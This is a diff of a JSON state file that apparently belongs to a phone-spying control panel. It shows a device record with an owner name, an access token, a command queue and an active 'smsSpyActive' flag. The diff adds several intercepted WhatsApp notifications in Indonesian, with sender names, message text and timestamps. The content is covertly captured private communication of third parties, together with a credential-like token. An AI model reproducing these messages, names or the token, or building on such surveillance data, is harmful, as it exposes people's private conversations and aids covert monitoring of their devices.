@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "74be2827eaa044a7872739b517404413",
-    "lastSeen": 1776764909903,
+    "lastSeen": 1776764913187,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T08:57:06.800Z",
@@ -20,6 +20,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "prily 🤍",
+        "content": "seng",
+        "time": "21/04 17:48",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776764913478
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎44 pesan dari 26 chat",
+        "time": "21/04 17:48",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776764912962
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "prily 🤍",
+        "content": "cara pin komen tiktok gimana sneg",
+        "time": "21/04 17:48",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776764912911
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Seleksi Host VIP Agency (3 pesan): ~ kyan kw",
+        "content": "Menyebut grup Anda secara privat di status",
+        "time": "21/04 17:48",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776764912794
+      },
       {
         "appName": "WhatsApp",
         "sender": "defra",
